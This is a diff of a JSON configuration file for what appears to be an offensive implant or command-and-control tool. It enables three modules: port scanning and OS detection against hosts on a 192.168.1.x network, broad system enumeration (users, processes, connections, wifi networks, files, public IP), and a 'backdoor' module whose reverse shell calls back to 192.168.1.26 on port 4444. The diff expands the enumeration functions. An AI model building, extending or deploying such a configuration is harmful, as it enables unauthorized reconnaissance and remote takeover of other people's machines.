@@ -1,36 +1,55 @@
 {
   "poll_interval": 60,
   "modules": [
-    {
-      "name": "portscanner",
-      "enabled": true,
-      "functions": {
-        "discover_ips": ["192.168.1"],
-        "scan_common_ports": ["192.168.1.59", true],
-        "scan_target": {
-          "ip": "192.168.1.59",
-          "ports": [21, 22, 80, 443],
-          "range_from": 1,
-          "range_to": 10,
-          "threaded": true
-        }
+      {
+          "name": "portscanner",
+          "enabled": true,
+          "functions": {
+              "scan_port": ["192.168.1.59", 80],
+              "scan_target": {
+                  "ip": "192.168.1.59",
+                  "ports": [21, 22, 80, 443],
+                  "range_from": 1,
+                  "range_to": 10,
+                  "threaded": true
+              },
+              "scan_common_ports": ["192.168.1.59", true],
+              "multi_threaded_scan": {
+                  "ip": "192.168.1.59",
+                  "ports": [21, 22, 80, 443],
+                  "num_threads": 4
+              },
+              "discover_ips": ["192.168.1", 1],
+              "detect_os": [["192.168.1.59"]],
+              "get_ip_details": ["192.168.1.59"],
+              "threader": ["192.168.1.59", []]
+          }
+      },
+      {
+          "name": "system_enumeration",
+          "enabled": true,
+          "functions": {
+              "get_active_connections": [],
+              "get_system_info": [],
+              "list_running_processes": [],
+              "get_network_config": [],
+              "get_wifi_networks": [],
+              "get_mac_address": [],
+              "get_disk_usage": [],
+              "list_files": ["."],
+              "get_current_user": [],
+              "list_users": [],
+              "get_os_version": [],
+              "get_public_ip": [],
+              "get_hostname": []
+          }
+      },
+      {
+          "name": "backdoor",
+          "enabled": true,
+          "functions": {
+              "reverse_shell": ["192.168.1.26", 4444]
+          }
       }
-    },
-    {
-      "name": "system_enumeration",
-      "enabled": true,
-      "functions": {
-        "get_active_connections": [],
-        "get_system_info": [],
-        "list_running_processes": []
-      }
-    },
-    {
-      "name": "backdoor",
-      "enabled": true,
-      "functions": {
-        "reverse_shell": ["192.168.1.26", 4444]
-      }
-    }
   ]
 }
